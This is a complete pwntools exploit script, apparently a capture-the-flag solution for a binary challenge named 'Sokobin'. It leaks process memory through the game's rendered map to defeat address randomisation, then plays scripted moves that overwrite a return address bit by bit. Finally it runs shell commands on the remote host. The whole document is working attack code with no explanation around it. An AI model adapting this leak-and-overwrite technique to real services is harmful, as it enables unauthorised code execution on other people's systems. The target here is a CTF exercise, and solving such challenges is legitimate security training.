from pwn import *

# io = process('./challenge_patched')
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def readdat():
    io.recvuntil("Sokobin!\n")
    res = []
    for _ in range(32):
        l = io.readline().strip()
        r = sum(1 << i for i, c in enumerate(l) if c == ord('o'))
        res.append(r)
    return b"".join(r.to_bytes(4, 'little') for r in res[::-1])

def readmap():
    io.recvuntil("Sokobin!\n")
    m = [[None]*32 for _ in range(32)]
    for y in range(32):
        l = io.readlineS().strip()
        for x, c in enumerate(l):
            assert c in "@.o"
            if c == "o":
                m[y][x] = -1
            elif c == "@":
                m[y][x] = 0
            else:
                m[y][x] = -2
    return m[::-1]

def stepsearch(m, x, y, c):
    assert 0 <= x < 32 and 0 <= y < 32
    if m[y][x] != -2:
        return m[y][x]
    if x > 0 and m[y][x-1] == c:
        return c+1
    if y > 0 and m[y-1][x] == c:
        return c + 1
    if y < 31 and m[y+1][x] == c:
        return c + 1
    if x < 31 and m[y][x+1] == c:
        return c + 1
    return -2

def flood(m):
    changed = True
    t = 0
    while changed:
        changed = False
        for y in range(32):
            for x in range(32):
                i = stepsearch(m, x, y, t)
                if i != m[y][x]:
                    m[y][x] = i
                    changed = True
        t += 1
    return m

dat = readdat()
pie = u64(dat[72:80])-0x1274
print(hex(pie))
target = pie + 0x1255
print(bin(target))

io.sendline("s"*16)
m = readmap()
flood(m)

cmap = {
    "r": (0, 1),
    "w": (0, -1),
    "a": (1, 0),
    "s": (-1, 0),
}

def findpath(m, x, y):
    if m[y][x] == 0:
        return ""
    if m[y][x] < 0:
        return None
    for dx, dy in [(-1, 0), (0, -1), (0, 1), (1, 0)]:
        if x + dx < 0 or x + dx >= 32 or y + dy < 0 or y + dy >= 32:
            continue
        if m[y+dy][x+dx] == m[y][x]-1:
            cs = [c for c, ds in cmap.items() if ds == (dx, dy)]
            assert len(cs) == 1
            return findpath(m, x+dx, y+dy) + cs[0]
    assert False

path = findpath(m, 0, 8)
path += "s"*31+"a"*31+"w"+"s"*31+"a"*31+"w"+"s"*31+"a"*31+"w"+"s"*31+"a"*31
path += "rrrr" + "s"*31 + ("wwwwrrrr" + "a")*15 + "wwwwa"
io.sendline(path)

def mypos(m):
    for y in range(32):
        for x in range(32):
            if m[y][x] == 0:
                return x, y

m = readmap()
flood(m)
px, py = mypos(m)

print(px, py)
tm = target&0xfffffffe
for _ in range(tm.bit_count()):
    # print("================", _, "================")
    for x in range(31, 0, -1):
        c = 0
        for y in range(12, 31):
            if m[y][x] == -1:
                if c >= 2:
                    break
                if m[y+1][x] >= 0:
                    p = findpath(m, x, y+1)
                    if x < tm.bit_length()-1:
                        p += "r" * (y-10) + "ar" + (tm.bit_length()-1-x)*"s"
                        hold = False
                    elif x == tm.bit_length()-1:
                        p += "r" * (y-10)
                        hold = False
                    else:
                        p += "r" * (y-11) + "sr" + (x-tm.bit_length()+1)*"a" + "war"
                        hold = False
                    tm &= ~(1<<(tm.bit_length()-1))
                    io.sendline(p)
                    if hold:
                        print(bin(target)[-32:])
                        io.interactive()
                        exit()
                    m = readmap()
                    flood(m)
                    px, py = mypos(m)
                    break
                c += 1
        else:
            continue
        if c < 2:
            break
    else:
        assert False

assert target & 1
c = 0
x = 0
for y in range(12, 31):
    if m[y][x] == -1:
        if m[y+1][x] >= 0:
            p = findpath(m, x, y+1)
            p += "r" * (y-10-c)
            io.sendline(p)
            m = readmap()
            flood(m)
            px, py = mypos(m)
            break
        c += 1

tm = target >> 32
for _ in range(tm.bit_count()):
    print("================", _, "================")
    x = tm.bit_length()-1
    c = 0
    for y in range(12, 31):
        if m[y][x] == -1:
            if m[y+1][x] >= 0:
                p = findpath(m, x, y+1)
                p += "r" * (y-11-c)
                tm &= ~(1<<(tm.bit_length()-1))
                io.sendline(p)
                # if _ == 3:
                #     print(bin(target)[:-32])
                #     io.interactive()
                #     exit()
                m = readmap()
                flood(m)
                px, py = mypos(m)
                break
            c += 1
    else:
        assert False



print(bin(target)[-32:])
print(bin(target)[:-32])

io.sendline("q")
io.sendline("./submitter ; echo shell ; exit")
print(io.readall())
# io.interactive()